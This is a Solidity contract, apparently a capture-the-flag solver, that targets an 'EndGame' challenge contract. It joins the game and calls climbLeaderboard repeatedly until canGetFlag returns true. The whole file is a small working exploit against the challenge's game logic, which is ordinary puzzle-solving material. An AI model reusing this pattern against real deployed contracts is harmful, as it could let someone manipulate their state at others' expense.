// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "./EndGame.sol";

contract EndGameSolver {
    EndGame victimContract;

    constructor(address victimAddress) public {
        victimContract = EndGame(victimAddress);
    }

    function solveChallenge() public returns (bool) {
        victimContract.joinedGame(address(this));
        victimContract.climbLeaderboard(200, address(this));
        for (uint256 i = 0; i < 10; i++) {
            victimContract.climbLeaderboard(1, address(this));
        }
        bool canGetFlagBool = victimContract.canGetFlag(address(this));

        return canGetFlagBool;
    }
}
